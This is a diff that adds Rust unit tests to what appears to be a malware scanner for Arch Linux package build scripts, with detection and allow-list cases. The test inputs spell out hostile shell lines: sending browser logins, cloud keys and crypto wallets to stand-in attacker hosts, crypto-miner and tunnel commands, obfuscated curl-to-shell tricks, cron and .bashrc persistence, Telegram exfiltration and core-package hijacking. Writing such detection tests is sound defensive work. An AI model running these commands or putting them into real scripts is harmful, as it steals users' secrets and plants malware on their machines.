@@ -698,4 +698,172 @@ package() {
         let findings = s.scan(content, None);
         assert!(findings.iter().any(|f| f.rule_id == "REVSHELL_DEV_TCP"));
     }
+
+    #[test]
+    fn detects_miner_xmrig() {
+        let s = test_scanner();
+        let content = "prepare() {\n  ./xmrig --donate-level 0 -o stratum+tcp://pool.supportxmr.com:3333\n}\n";
+        let findings = s.scan(content, None);
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.rule_id == "MINER_XMRIG" || f.rule_id == "MINER_POOL")
+        );
+    }
+
+    #[test]
+    fn detects_browser_credential_theft() {
+        let s = test_scanner();
+        let content = "find ~/.mozilla/firefox -name 'logins.json' -exec curl -F 'file=@{}' https://attacker.com/ \\\n";
+        let findings = s.scan(content, None);
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.rule_id == "CRED_BROWSER_PROFILES")
+        );
+    }
+
+    #[test]
+    fn detects_cloud_token_theft() {
+        let s = test_scanner();
+        let content = "tar -czf /tmp/keys.tar.gz .aws/credentials .kube/config\n";
+        let findings = s.scan(content, None);
+        assert!(findings.iter().any(|f| f.rule_id == "CRED_CLOUD_CREDS"));
+    }
+
+    #[test]
+    fn detects_crypto_wallet_theft() {
+        let s = test_scanner();
+        let content = "cat .config/Exodus/exodus.wallet | base64 | curl -d @- https://c2.evil\n";
+        let findings = s.scan(content, None);
+        assert!(findings.iter().any(|f| f.rule_id == "CRED_CRYPTO_WALLETS"));
+    }
+
+    #[test]
+    fn detects_reverse_proxy_tunnel() {
+        let s = test_scanner();
+        let content = "curl -fsSL https://tunnel.ngrok.io/c2_connect && ./client --target tunnel.serveo.net\n";
+        let findings = s.scan(content, None);
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.rule_id == "THREAT_INTEL_TUNNEL_PROXY")
+        );
+    }
+
+    #[test]
+    fn detects_eval_obfuscation() {
+        let s = test_scanner();
+        let content =
+            "PAYLOAD=\"c3lzdGVtY3RsIHN0b3AgZmlyZXdhbGxk\"\neval \"$(echo $PAYLOAD | base64 -d)\"\n";
+        let findings = s.scan(content, None);
+        assert!(findings.iter().any(|f| f.rule_id == "OBFUSCATED_EVAL"));
+    }
+
+    #[test]
+    fn detects_reversed_string_exec() {
+        let s = test_scanner();
+        let content = "echo 'hsab | htam/xile//:sptth lruc' | rev | bash\n";
+        let findings = s.scan(content, None);
+        assert!(findings.iter().any(|f| f.rule_id == "OBFUSCATED_REV_PIPE"));
+    }
+
+    #[test]
+    fn detects_printf_hex_and_octal() {
+        let s = test_scanner();
+        let hex = "printf '\\x63\\x75\\x72\\x6c\\x20\\x68\\x74\\x74\\x70' | sh\n";
+        assert!(
+            s.scan(hex, None)
+                .iter()
+                .any(|f| f.rule_id == "OBFUSCATED_PRINTF_HEX")
+        );
+
+        let octal = "printf '\\143\\165\\162\\154\\040\\150\\164\\164\\160' | bash\n";
+        assert!(
+            s.scan(octal, None)
+                .iter()
+                .any(|f| f.rule_id == "OBFUSCATED_PRINTF_OCTAL")
+        );
+    }
+
+    #[test]
+    fn allows_chrome_sandbox_suid_whitelisted() {
+        let s = test_scanner();
+        let content =
+            "package() {\n  chmod 4755 \"${pkgdir}/opt/google/chrome/chrome-sandbox\"\n}\n";
+        let findings = s.scan(content, Some("google-chrome"));
+        assert!(!findings.iter().any(|f| f.rule_id == "SUS_CHMOD_SUID"));
+    }
+
+    #[test]
+    fn allows_vcs_skip_hash_whitelisted() {
+        let s = test_scanner();
+        let content = "pkgname=neovim-git\npkgver=0.10.0\nsource=('git+https://github.com/neovim/neovim.git')\nsha256sums=('SKIP')\n";
+        let findings = s.scan(content, Some("neovim-git"));
+        assert!(!findings.iter().any(|f| f.rule_id == "PKG_SKIP_HASH"));
+    }
+
+    #[test]
+    fn detects_unhashed_source_in_regular_package() {
+        let s = test_scanner();
+        let content = "pkgname=suspicious-bin\npkgver=1.0\nsource=('https://attacker.com/payload.tar.gz')\nsha256sums=('SKIP')\n";
+        let findings = s.scan(content, Some("suspicious-bin"));
+        assert!(findings.iter().any(|f| f.rule_id == "PKG_SKIP_HASH"));
+    }
+
+    #[test]
+    fn detects_packaging_replaces_hijacking() {
+        let s = test_scanner();
+        let content = "pkgname=fake-keyring\nreplaces=('archlinux-keyring' 'systemd')\n";
+        let findings = s.scan(content, Some("fake-keyring"));
+        assert!(findings.iter().any(|f| f.rule_id == "PKG_REPLACE_CORE"));
+    }
+
+    #[test]
+    fn detects_packaging_provides_core_package() {
+        let s = test_scanner();
+        let content = "pkgname=fake-init\nprovides=('systemd')\n";
+        let findings = s.scan(content, Some("fake-init"));
+        assert!(findings.iter().any(|f| f.rule_id == "PKG_PROVIDES_CORE"));
+    }
+
+    #[test]
+    fn detects_crontab_persistence() {
+        let s = test_scanner();
+        let content = "echo '0 * * * * curl http://c2.evil/bot | sh' | crontab -\n";
+        let findings = s.scan(content, None);
+        assert!(findings.iter().any(|f| f.rule_id == "PERSIST_CRON"));
+    }
+
+    #[test]
+    fn detects_bashrc_persistence() {
+        let s = test_scanner();
+        let content = "echo 'export LD_PRELOAD=/opt/libhide.so' >> .bashrc\n";
+        let findings = s.scan(content, None);
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.rule_id == "PERSIST_PROFILE_INJECT")
+        );
+    }
+
+    #[test]
+    fn detects_telegram_c2_bot() {
+        let s = test_scanner();
+        let content = "curl -s -X POST https://api.telegram.org/bot123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11/sendMessage -d chat_id=123 -d text=\"$(whoami)\"\n";
+        let findings = s.scan(content, None);
+        assert!(findings.iter().any(|f| f.rule_id == "EXFIL_TELEGRAM_BOT"));
+    }
+
+    #[test]
+    fn detects_variable_splicing_obfuscation() {
+        let s = test_scanner();
+        let content = "a=\"c\"\nb=\"u\"\nc=\"r\"\nd=\"l\"\n";
+        let findings = s.scan(content, None);
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.rule_id == "SUS_VARIABLE_SPLICING")
+        );
+    }
 }
